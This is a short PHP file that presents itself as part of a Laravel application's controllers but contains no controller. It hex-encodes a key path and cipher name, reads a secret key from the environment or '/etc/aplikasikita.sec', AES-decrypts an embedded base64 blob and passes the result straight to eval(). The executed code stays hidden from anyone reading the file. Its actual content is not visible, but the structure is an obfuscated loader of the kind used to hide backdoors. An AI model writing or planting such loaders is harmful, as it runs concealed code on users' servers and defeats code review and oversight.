<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('XZ5HCk4ywFP4GRBGmYARtw==');

$c=base64_decode(

'eflJjtO7NUG9xri7ZxBifwCNb5wSGNBKZTtoQB5P8irfo/OrYOLDgwTBD4p0EdVYZdy8kWnqOn4w' .
'+JElKvhCsTXG3DeqAsom0D5NRXgNZBaWGCk8yqWPpSvDygdR3yHbmuTFU5xsyERouLyhkqSr0qMf' .
'RAc42xwYPTA/wDW1f1cN7+H7kSMBjQdqR97sTFtd082SJBXkMVMdLklAVy3a+F2W/t8u11k5w+ZL' .
'6/OXozCz/gMyloEP9jhXHNkeABZj'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

